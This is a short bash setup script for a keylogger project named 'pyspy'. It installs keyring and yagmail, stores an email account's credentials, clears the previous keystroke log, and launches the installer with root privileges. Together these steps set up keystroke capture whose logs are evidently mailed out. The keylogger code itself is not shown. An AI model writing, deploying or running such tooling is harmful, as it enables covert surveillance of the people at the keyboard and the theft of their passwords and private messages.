#!/bin/bash

# the purpose of this script is to do the setup and begin running the keylogger for you
# this script will take your pyspy server email and password. It will then add the 
# pair to the keyring for authentication use.

# Brady Murphy
# June 17, 2019

# install the python modules if needed
pip3 install keyring
pip3 install yagmail

# run the email setup script, then installer
python3 src/setup.py

# remove the previous log
FILE=key_log.txt
if [ -f "$FILE" ]; then
    sudo rm $FILE
	echo "Removed previous log history"
fi

# run the script
sudo python3 src/installer.py
